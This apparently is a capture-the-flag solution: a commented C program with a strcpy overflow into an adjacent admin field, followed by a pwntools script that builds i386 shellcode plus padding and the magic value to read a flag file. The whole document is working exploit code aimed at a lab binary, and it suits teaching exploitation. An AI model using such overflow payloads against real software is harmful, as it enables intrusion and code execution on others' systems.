# #include <string.h>
# #include <stdio.h>
# #include <stdlib.h>
# #include <sys/mman.h>

# struct auth
# {
#         char call[256];
#         int admin;
# };

# struct auth a;

# void admin(struct auth *a)
# {
#         if (a->admin == 0xdeadb0f)
#         {
#                 mprotect((unsigned)a & ~0xfff, sizeof(*a), PROT_READ | PROT_WRITE | PROT_EXEC);
#                 (*(void(*)())a->call)();
#         }
# }

# int main(int argc, char **argv)
# {
#         if (argc == 2)
#         {
#                 a.admin = 0;
#                 strcpy(a.call, argv[1]);
#                 admin(&a);
#         }

#         return 0;
# }


#!/usr/bin/python3
from pwn import *
context.arch = 'i386'
context.encoding = 'latin'
context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-h"]
warnings.simplefilter('ignore')

# shellcode
asm = asm(shellcraft.i386.linux.cat('/home/basic8/flag')) + asm(shellcraft.i386.linux.exit(42))
# admin passcode
admin = b'\x0f\xdb\xea\x0d'
# putting it all together
payload = asm + b'a'*(256-len(asm)) + admin
# start process and get the flag
p = process(['/home/basic8/basic8', payload])

print(p.clean())